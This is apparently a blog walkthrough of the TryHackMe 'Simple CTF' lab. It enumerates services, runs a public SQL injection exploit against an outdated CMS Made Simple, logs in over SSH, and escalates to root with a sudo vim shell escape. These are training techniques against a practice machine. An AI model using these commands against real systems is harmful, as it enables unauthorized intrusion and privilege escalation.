# **Description**

Hello l33ts, I hope you are doing well. Today we are going to look at [Simple CTF](https://tryhackme.com/room/easyctf) from [TryHackMe](https://tryhackme.com/), an easy machine where we find an outdated CMS, us an exploit for that to get ssh credentials, and finally escalate to root using Vim. If you have any questions please feel free to ask me on any of my [socials](https://nasrallahbaadi.github.io/about).

# **Enumeration**
## nmap

As always, we run a nmap scan:

```terminal
$ sudo nmap -sC -sV -p- 10.10.92.122 | tee scans/nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-27 05:26 EST

```

We have 3 open port:
 - 21 - FTP
 - 80 - HTTP
 - 2222 - SSH

## FTP

From the nmap scan, we see that anonymous FTP login is allowed, so let's take a look:

```terminal
$ ftp 10.10.92.122                                                                                                                                   130 тип

```

>NOTE: When i tried to list the content, it gave me this "229 Entering Extended Passive Mode (|||44846|)" the way i solved was by typing `ctrl+c` and then the command `passive`.

The file we found is a note indicating that the password is so weak and can be cracked in seconds!

## HTTP

Let's now check the web server and see what's there:

![home](/assets/img/tryhackme/simplectf/home.png)

Nothing interesting, let's run a directory scan using Gobuster:

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.92.122 | tee scans/gobuster
===============================================================

/simple               (Status: 301) [Size: 313] [--> http://10.10.92.122/simple/]

===============================================================
```

We found **/robots.txt** file and **/simple** directory, robots file has nothing useful for us, and we find CMS Made Simple running on the machine, and it is displaying the version of it in the bottom left corner:

![version](/assets/img/tryhackme/simplectf/version.png)

We found that this version of the CMS is vulnerable to SQL injection, here is the [exploit](https://www.exploit-db.com/exploits/46635).

## SQLi

After downloading the exploit, we can launch the attack with the following command:`python <exploit>.py -u http://{target_IP}/simple/ -c -w {path/to/the/wordlist}`


```terminal

[+] Salt for password found: 1daREDACTED6bb2
[+] Username found: m___h
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468REDACTEDc7eb73846e8d96
[+] Password cracked: s_____

```

> Note: I have masked the the data above, but if you run the exploit, you will get the username and the password.


# **Foothold**

Now that we have a username and password, we can try to connect to SSH

`ssh -p 2222 username@{target_IP}`

```terminal
$ ssh -p 2222 m____@10.10.92.122
m____@10.10.92.122's password:

$ ls
user.txt
```

Great, we got access to the machine via SSH, let's do some enumeration to see what can we find:

```terminal
$ sudo -l
User m___h may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```


# **Privilege Escalation**

With our current user, we can run `vim` as root, this is great, if we go to [GTFPBins](https://gtfobins.github.io/) we can see that there is a way to escalate our privileges to root using this command: `sudo vim -c ':!/bin/bash'` , so let's do it:

```terminal
$ sudo vim -c ':!/bin/bash'

root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Machine:~# ls /root
root.txt
```

And just like that, we got root on the machine.

I hope you guys have enjoyed this machine, see you in the next hack.
